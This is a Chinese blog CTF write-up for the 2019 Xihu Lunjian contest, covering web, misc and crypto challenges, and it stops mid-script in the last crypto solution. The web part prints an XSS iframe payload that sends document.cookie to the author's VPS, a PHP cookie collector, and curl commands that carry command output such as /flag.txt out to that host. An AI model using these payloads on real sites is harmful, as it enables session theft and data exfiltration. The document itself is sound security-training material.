<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>
    西湖论剑2019 wp | 道萝岗特森&#39;s Blog
  </title>
  <meta name="description" content="hello world">
  
  <meta name="keywords" content="
  writeup
  ">
  
  <meta name="author" content="daolgts">

  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta name="theme-color" content="#1e2327">
  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">

  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  

  
<script>
  var _hmt = _hmt || [];
  (function(){var hm = document.createElement("script");
    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
</script>


  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
</head>

<body id="replica-app">

<nav class="navbar-wrapper">
  <div class="navbar">
    <div class="container clearfix">
      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>

      <div class="navbar-search float-left desktop-only">
        <div class="navbar-search-form">
          <label for="gsc-i-id1">This website</label>
          <div id="google-search">
            <gcse:search></gcse:search>
          </div>
        </div>
      </div>

      <ul class="navbar-nav float-left">
        
        <li><a href="/archives">Archives</a></li>
        
        <!--  -->
        
        <li><a href="/tags">Tags</a></li>
        
        
          <li><a href="/links">Links</a></li>
        
        
          <li><a href="/about">About</a></li>
        
        
      </ul>

      <ul class="navbar-nav user-nav float-right desktop-only">
        <li class="user-nav-notification">
          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
        </li>
        <li>
          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
        </li>
        <li class="user-nav-logo">
          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
        </li>
      </ul>
    </div>
  </div>
</nav>

<div class="main-container">
  <header class="header-wrapper desktop-only">
  <div class="container header-site-detail">
    <ul class="header-toolbar">
      <li class="clearfix">
        <a href="/archives" class="header-toolbar-left"><i
                  class="fa fa-file-text"></i> Posts </a>
        <a href="/archives"
           class="header-toolbar-right"> 35 </a>
      </li>
      <li>
        <a href="/tags" class="header-toolbar-left"><i
                  class="fa fa-tags"></i> Tags </a>
        <a href="/tags"
           class="header-toolbar-right"> 17 </a>
      </li>
      <li>
        <a href="/categories" class="header-toolbar-left"><i
                  class="fa fa-folder-open"></i> Categories </a>
        <a href="/categories"
           class="header-toolbar-right"> 0 </a>
      </li>
    </ul>
    <h2 class="header-title">
      <i class="fa fa-book text-muted"></i>
      <a href="/">道萝岗特森&#39;s Blog</a>
      
      
    </h2>
  </div>

  <div class="container">
    <div class="header-tab-wrapper clearfix">
      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
    </div>
  </div>
</header>


<div class="post-container container">
  <h3>
    <i class="fa fa-user-o"></i>
    daolgts

    <span class="post-date float-right" title="{{moment(1554728326000).format('MMM DD, YYYY, h:mm:ss A')}}">
      <i class="fa fa-pencil-square-o"></i>
      {{moment(1554728326000).fromNow()}}
    </span>
  </h3>

  <article class="post-content">
    <h1>西湖论剑2019 wp</h1>
    <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyyt3"><a href="#babyyt3" class="headerlink" title="babyyt3"></a>babyyt3</h2><p>查看页面源代码发现提示<code>dir.php</code></p>
<p>利用<code>php://filter/read=convert.quoted-printable-encode/resource=</code>伪协议来读php文件的源码</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span> (!$a) &#123;</span><br><span class="line">	$a = <span class="string">'./templates/index.html'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="string">'flag'</span>,$a)!==<span class="keyword">false</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>dir.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure>

<p>view-source:<a href="http://ctf3.linkedbyx.com:11260/dir.php?dir=/" target="_blank" rel="noopener">http://ctf3.linkedbyx.com:11260/dir.php?dir=/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">array(25) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;..&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(10) &quot;.dockerenv&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(3) &quot;bin&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  string(4) &quot;boot&quot;</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(3) &quot;dev&quot;</span><br><span class="line">  [6]=&gt;</span><br><span class="line">  string(3) &quot;etc&quot;</span><br><span class="line">  [7]=&gt;</span><br><span class="line">  string(16) &quot;ffffflag_1s_Her4&quot;</span><br><span class="line">  [8]=&gt;</span><br><span class="line">  string(4) &quot;home&quot;</span><br><span class="line">  [9]=&gt;</span><br><span class="line">  string(3) &quot;lib&quot;</span><br><span class="line">  [10]=&gt;</span><br><span class="line">  string(5) &quot;lib64&quot;</span><br><span class="line">  [11]=&gt;</span><br><span class="line">  string(5) &quot;media&quot;</span><br><span class="line">  [12]=&gt;</span><br><span class="line">  string(3) &quot;mnt&quot;</span><br><span class="line">  [13]=&gt;</span><br><span class="line">  string(7) &quot;my_init&quot;</span><br><span class="line">  [14]=&gt;</span><br><span class="line">  string(10) &quot;my_service&quot;</span><br><span class="line">  [15]=&gt;</span><br><span class="line">  string(3) &quot;opt&quot;</span><br><span class="line">  [16]=&gt;</span><br><span class="line">  string(4) &quot;proc&quot;</span><br><span class="line">  [17]=&gt;</span><br><span class="line">  string(4) &quot;root&quot;</span><br><span class="line">  [18]=&gt;</span><br><span class="line">  string(3) &quot;run&quot;</span><br><span class="line">  [19]=&gt;</span><br><span class="line">  string(4) &quot;sbin&quot;</span><br><span class="line">  [20]=&gt;</span><br><span class="line">  string(3) &quot;srv&quot;</span><br><span class="line">  [21]=&gt;</span><br><span class="line">  string(3) &quot;sys&quot;</span><br><span class="line">  [22]=&gt;</span><br><span class="line">  string(3) &quot;tmp&quot;</span><br><span class="line">  [23]=&gt;</span><br><span class="line">  string(3) &quot;usr&quot;</span><br><span class="line">  [24]=&gt;</span><br><span class="line">  string(3) &quot;var&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现<code>ffffflag_1s_Her4</code>，文件包含直接读得到flag<code>flag{8dc25fd21c52958f777ce92409e2802a}</code></p>
<h2 id="Breakout"><a href="#Breakout" class="headerlink" title="Breakout"></a>Breakout</h2><p>html entity 编码+Bookmarklet打 cookie</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascrip&amp;#x74;:location.href='http://vps/c.php?1='+document.cookie"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>vps 端</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="number">1</span>]))</span><br><span class="line">&#123;</span><br><span class="line">file_put_contents(<span class="string">'/tmp/con.txt'</span>,$_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到 admin 的 cookie，执行命令<br><img src="https://i.loli.net/2019/04/07/5ca9aed19321b.png" alt></p>
<p>在 vps 上用 python 起个 http 服务<br><code>python -m SimpleHTTPServer 9001</code></p>
<p>curl + <code>`</code> 带出命令回显, 用 base64 编码空白符，得到所有结果</p>
<p><code>curl vps:9001=`ls | base64`</code></p>
<p>最后得到 flag</p>
<p><code>curl vps:9001?1=`cat /flag.txt | base64`</code></p>
<p><img src="https://i.loli.net/2019/04/07/5ca9afeb4dfeb.png" alt></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ZmxhZ3tmYTUxMzIwYWU4MDhjNzA0ODVkZDVmMzAzMzcwMjZkNn0= | base64 -D</span><br><span class="line">flag&#123;fa51320ae808c70485dd5f30337026d6&#125;</span><br></pre></td></tr></table></figure>

<h2 id="猜猜flag是什么"><a href="#猜猜flag是什么" class="headerlink" title="猜猜flag是什么"></a>猜猜flag是什么</h2><p>扫目录得到 .DS_Store，利用 .DS_Store 文件泄漏得到以下目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] http://ctf3.linkedbyx.com:11272/.DS_Store</span><br><span class="line">[+] http://ctf3.linkedbyx.com:11272/yingyingying/.DS_Store</span><br><span class="line">[+] http://ctf3.linkedbyx.com:11272/index.php/.DS_Store</span><br><span class="line">[+] http://ctf3.linkedbyx.com:11272/flag</span><br><span class="line">[+] http://ctf3.linkedbyx.com:11272/yingyingying/index.html</span><br><span class="line">[+] http://ctf3.linkedbyx.com:11272/e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure>

<p>e10adc3949ba59abbe56e057f20f883e 目录下还有 .git 源码泄露</p>
<p>利用 GitHack 得到</p>
<p><img src="https://i.loli.net/2019/04/07/5ca9cddd0b68a.png" alt></p>
<p>明文攻击拿到 hint</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code is 9faedd5999937171912159d28b219d86</span><br><span class="line">well ok ur good...By the way, flag saved in flag/seed.txt</span><br></pre></td></tr></table></figure>

<p>首页 GET 传入 code，得到 64560218，然后爆破随机数拿到种子</p>
<p><img src="https://i.loli.net/2019/04/07/5ca9ce4ca6faa.png" alt></p>
<p>由提示访问 <code>http://ctf3.linkedbyx.com:11272/flag/872367.txt</code> 拿到 flag</p>
<p><code>flag{0730b6193000e9334b12cf7c95fbc736}</code></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="最短的路"><a href="#最短的路" class="headerlink" title="最短的路"></a>最短的路</h2><p>最短路径问题，使用python的networkx库</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line"></span><br><span class="line">data=[(<span class="string">'FloraPrice'</span>,<span class="string">'E11'</span>),(<span class="string">'FloraPrice'</span>,<span class="string">'E9'</span>),(<span class="string">'FloraPrice'</span>,<span class="string">'75D&#125;'</span>),(<span class="string">'NoraFayette'</span>,<span class="string">'E11'</span>),(<span class="string">'NoraFayette'</span>,<span class="string">'E10'</span>),(<span class="string">'NoraFayette'</span>,<span class="string">'E13'</span>),(<span class="string">'NoraFayette'</span>,<span class="string">'E12'</span>),(<span class="string">'NoraFayette'</span>,<span class="string">'E14'</span>),(<span class="string">'NoraFayette'</span>,<span class="string">'E9'</span>),(<span class="string">'NoraFayette'</span>,<span class="string">'E7'</span>),(<span class="string">'NoraFayette'</span>,<span class="string">'E6'</span>),(<span class="string">'E10'</span>,<span class="string">'SylviaAvondale'</span>),(<span class="string">'E10'</span>,<span class="string">'MyraLiddel'</span>),(<span class="string">'E10'</span>,<span class="string">'HelenLloyd'</span>),(<span class="string">'E10'</span>,<span class="string">'KatherinaRogers'</span>),(<span class="string">'VerneSanderson'</span>,<span class="string">'E7'</span>),(<span class="string">'VerneSanderson'</span>,<span class="string">'E12'</span>),(<span class="string">'VerneSanderson'</span>,<span class="string">'E9'</span>),(<span class="string">'VerneSanderson'</span>,<span class="string">'E8'</span>),(<span class="string">'E12'</span>,<span class="string">'HelenLloyd'</span>),(<span class="string">'E12'</span>,<span class="string">'KatherinaRogers'</span>),(<span class="string">'E12'</span>,<span class="string">'SylviaAvondale'</span>),(<span class="string">'E12'</span>,<span class="string">'MyraLiddel'</span>),(<span class="string">'E14'</span>,<span class="string">'SylviaAvondale'</span>),(<span class="string">'E14'</span>,<span class="string">'75D&#125;'</span>),(<span class="string">'E14'</span>,<span class="string">'KatherinaRogers'</span>),(<span class="string">'FrancesAnderson'</span>,<span class="string">'E5'</span>),(<span class="string">'FrancesAnderson'</span>,<span class="string">'E6'</span>),(<span class="string">'FrancesAnderson'</span>,<span class="string">'E8'</span>),(<span class="string">'FrancesAnderson'</span>,<span class="string">'E3'</span>),(<span class="string">'DorothyMurchison'</span>,<span class="string">'E9'</span>),(<span class="string">'DorothyMurchison'</span>,<span class="string">'E8'</span>),(<span class="string">'EvelynJefferson'</span>,<span class="string">'E9'</span>),(<span class="string">'EvelynJefferson'</span>,<span class="string">'E8'</span>),(<span class="string">'EvelynJefferson'</span>,<span class="string">'E5'</span>),(<span class="string">'EvelynJefferson'</span>,<span class="string">'E4'</span>),(<span class="string">'EvelynJefferson'</span>,<span class="string">'E6'</span>),(<span class="string">'EvelynJefferson'</span>,<span class="string">'E1'</span>),(<span class="string">'EvelynJefferson'</span>,<span class="string">'E3'</span>),(<span class="string">'EvelynJefferson'</span>,<span class="string">'E2'</span>),(<span class="string">'RuthDeSand'</span>,<span class="string">'E5'</span>),(<span class="string">'RuthDeSand'</span>,<span class="string">'E7'</span>),(<span class="string">'RuthDeSand'</span>,<span class="string">'E9'</span>),(<span class="string">'RuthDeSand'</span>,<span class="string">'E8'</span>),(<span class="string">'HelenLloyd'</span>,<span class="string">'E11'</span>),(<span class="string">'HelenLloyd'</span>,<span class="string">'E7'</span>),(<span class="string">'HelenLloyd'</span>,<span class="string">'E8'</span>),(<span class="string">'OliviaCarleton'</span>,<span class="string">'E11'</span>),(<span class="string">'OliviaCarleton'</span>,<span class="string">'E9'</span>),(<span class="string">'EleanorNye'</span>,<span class="string">'E5'</span>),(<span class="string">'EleanorNye'</span>,<span class="string">'E7'</span>),(<span class="string">'EleanorNye'</span>,<span class="string">'E6'</span>),(<span class="string">'EleanorNye'</span>,<span class="string">'E8'</span>),(<span class="string">'E9'</span>,<span class="string">'TheresaAnderson'</span>),(<span class="string">'E9'</span>,<span class="string">'PearlOglethorpe'</span>),(<span class="string">'E9'</span>,<span class="string">'KatherinaRogers'</span>),(<span class="string">'E9'</span>,<span class="string">'SylviaAvondale'</span>),(<span class="string">'E9'</span>,<span class="string">'MyraLiddel'</span>),(<span class="string">'E8'</span>,<span class="string">'TheresaAnderson'</span>),(<span class="string">'E8'</span>,<span class="string">'PearlOglethorpe'</span>),(<span class="string">'E8'</span>,<span class="string">'KatherinaRogers'</span>),(<span class="string">'E8'</span>,<span class="string">'SylviaAvondale'</span>),(<span class="string">'E8'</span>,<span class="string">'BrendaRogers'</span>),(<span class="string">'E8'</span>,<span class="string">'LauraMandeville'</span>),(<span class="string">'E8'</span>,<span class="string">'MyraLiddel'</span>),(<span class="string">'E5'</span>,<span class="string">'TheresaAnderson'</span>),(<span class="string">'E5'</span>,<span class="string">'BrendaRogers'</span>),(<span class="string">'E5'</span>,<span class="string">'LauraMandeville'</span>),(<span class="string">'E5'</span>,<span class="string">'CharlotteMcDowd'</span>),(<span class="string">'E4'</span>,<span class="string">'CharlotteMcDowd'</span>),(<span class="string">'E4'</span>,<span class="string">'TheresaAnderson'</span>),(<span class="string">'E4'</span>,<span class="string">'BrendaRogers'</span>),(<span class="string">'E7'</span>,<span class="string">'TheresaAnderson'</span>),(<span class="string">'E7'</span>,<span class="string">'SylviaAvondale'</span>),(<span class="string">'E7'</span>,<span class="string">'BrendaRogers'</span>),(<span class="string">'E7'</span>,<span class="string">'LauraMandeville'</span>),(<span class="string">'E7'</span>,<span class="string">'CharlotteMcDowd'</span>),(<span class="string">'E6'</span>,<span class="string">'TheresaAnderson'</span>),(<span class="string">'E6'</span>,<span class="string">'PearlOglethorpe'</span>),(<span class="string">'E6'</span>,<span class="string">'BrendaRogers'</span>),(<span class="string">'E6'</span>,<span class="string">'LauraMandeville'</span>),(<span class="string">'E1'</span>,<span class="string">'LauraMandeville'</span>),(<span class="string">'E1'</span>,<span class="string">'BrendaRogers'</span>),(<span class="string">'E3'</span>,<span class="string">'TheresaAnderson'</span>),(<span class="string">'E3'</span>,<span class="string">'BrendaRogers'</span>),(<span class="string">'E3'</span>,<span class="string">'LauraMandeville'</span>),(<span class="string">'E3'</span>,<span class="string">'CharlotteMcDowd'</span>),(<span class="string">'E3'</span>,<span class="string">'flag&#123;'</span>),(<span class="string">'E2'</span>,<span class="string">'LauraMandeville'</span>),(<span class="string">'E2'</span>,<span class="string">'TheresaAnderson'</span>),(<span class="string">'KatherinaRogers'</span>,<span class="string">'E13'</span>),(<span class="string">'E13'</span>,<span class="string">'SylviaAvondale'</span>)]</span><br><span class="line">G=nx.Graph()</span><br><span class="line">G.add_edges_from(data)</span><br><span class="line"><span class="keyword">print</span> nx.shortest_path(G,<span class="string">'flag&#123;'</span>, <span class="string">'75D&#125;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ['flag&#123;', 'E3', 'EvelynJefferson', 'E9', 'FloraPrice', '75D&#125;']</span></span><br><span class="line"><span class="comment"># flag&#123;E3EvelynJeffersonE9FloraPrice75D&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="奇怪的TTL字段"><a href="#奇怪的TTL字段" class="headerlink" title="奇怪的TTL字段"></a>奇怪的TTL字段</h2><p>搜索发现TTL信息隐藏技术</p>
<blockquote>
<p>IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。</p>
</blockquote>
<p>所以取各TTL值的前两位作为有效值，八位为一组拼接起来，最后得到一张图片</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(i)[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> [int(b,<span class="number">2</span>) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">' '</span>)]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"ttl.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher=f.read().replace(<span class="string">'TTL='</span>,<span class="string">''</span>).strip().split(<span class="string">"\n"</span>)</span><br><span class="line">ans=<span class="string">""</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    count+=<span class="number">2</span></span><br><span class="line">    ans+=<span class="string">'&#123;:08b&#125;'</span>.format(int(i))[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(count%<span class="number">8</span>==<span class="number">0</span>):</span><br><span class="line">        ans+=<span class="string">" "</span></span><br><span class="line"><span class="comment"># print ans</span></span><br><span class="line">o=open(<span class="string">"outfile1"</span>,<span class="string">"wb"</span>)</span><br><span class="line">o.write(decode(ans.strip()).decode(<span class="string">"hex"</span>).decode(<span class="string">"hex"</span>))</span><br></pre></td></tr></table></figure>

<p>foremost提取出另外六张图片，拼起来得到一张完整的二维码，扫描二维码得到又一个密文</p>
<p><img src="https://s2.ax1x.com/2019/04/07/AhTElT.png" alt="AhTElT.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key:AutomaticKey cipher:fftu&#123;2028mb39927wn1f96o6e12z03j58002p&#125;</span><br></pre></td></tr></table></figure>

<p>自动密钥密码，找到在线解密网站解密<br><img src="https://s2.ax1x.com/2019/04/07/AhTApV.png" alt="AhTApV.png"></p>
<p>得到flag<code>flag{2028ab39927df1d96e6a12b03e58002e}</code></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="hardgame"><a href="#hardgame" class="headerlink" title="hardgame"></a>hardgame</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>e=2,应该是rabin算法</p>
<p>这里直接用ctf-rsa-tool解出来了</p>
<p><img src="https://s2.ax1x.com/2019/04/07/AhbWAH.png" alt="AhbWAH.png"></p>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>参考 <a href="https://xz.aliyun.com/t/3101#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3101#toc-2</a></p>
<p>分析<code>des.py</code>发现所有的明文都用一个八位大写的密钥加密</p>
<p>发现<code>enc.txt</code>中有些行末尾16位是一样的，猜出这是Padding</p>
<p>然后用<code>hashcat</code>爆破key，得到key为<code>JFRYOMPR</code>，然后解密，找到其中的flag</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># data=""</span></span><br><span class="line"><span class="comment"># with open("enc.txt","r") as f:</span></span><br><span class="line"><span class="comment">#     for line in f.readlines():</span></span><br><span class="line"><span class="comment">#         line=line.strip() </span></span><br><span class="line"><span class="comment">#         if line[-16:] in data:</span></span><br><span class="line"><span class="comment">#             print line[-16:]</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             data+=line[-16:]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hashcat -m 14000 ea9c3c12181a1e82:0808080808080808 -a 3 '?u?u?u?u?u?u?u?u' --force</span></span><br><span class="line"><span class="comment"># ea9c3c12181a1e82:0808080808080808:JFRYOMPR       </span></span><br><span class="line"></span><br><span class="line">Des_Key=<span class="string">"JFRYOMPR"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesDecrypt</span><span class="params">(str)</span>:</span></span><br><span class="line">    k = des(Des_Key, ECB, pad=<span class="literal">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">    <span class="keyword">return</span> k.decrypt(str.decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"enc.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line=line.strip() </span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> DesDecrypt(line):</span><br><span class="line">            <span class="keyword">print</span> DesDecrypt(line)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag2&#123;Fuck_Y0u_cAn_Ge7_Se3ond&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="final-flag"><a href="#final-flag" class="headerlink" title="final flag"></a>final flag</h3><p>密文(padding(填充f)后)每4个一组，然后进行rsa加密,格式化为512长度的无符号16进制，再与前256位异或加密</p>
<p>循环用fff的后一块异或前一块得到rsa的密文</p>
<p>RSA加密的明文长度极短只有4，可以用n和e遍历加密一遍，生成一个字典，然后根据密文，选择明文攻击</p>
<p>最后得到明文转为十进制，除以flag1和flag2的十进制，转为字符串得到flag</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line">n=<span 